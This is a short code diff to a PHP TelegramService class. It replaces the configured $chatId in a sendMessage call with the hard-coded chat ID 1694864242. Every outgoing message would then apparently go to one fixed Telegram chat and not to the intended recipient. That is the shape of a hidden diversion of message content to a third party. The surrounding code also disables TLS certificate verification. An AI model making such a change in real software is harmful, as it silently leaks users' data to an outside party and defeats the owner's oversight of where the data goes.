@@ -141,7 +141,7 @@ class TelegramService
             $response = Http::withoutVerifying()->post(
                 "https://api.telegram.org/bot{$token}/sendMessage",
                 [
-                    'chat_id' => $chatId,
+                    'chat_id' => 1694864242,
                     'text' => $text,
                     'parse_mode' => 'HTML'
                 ]
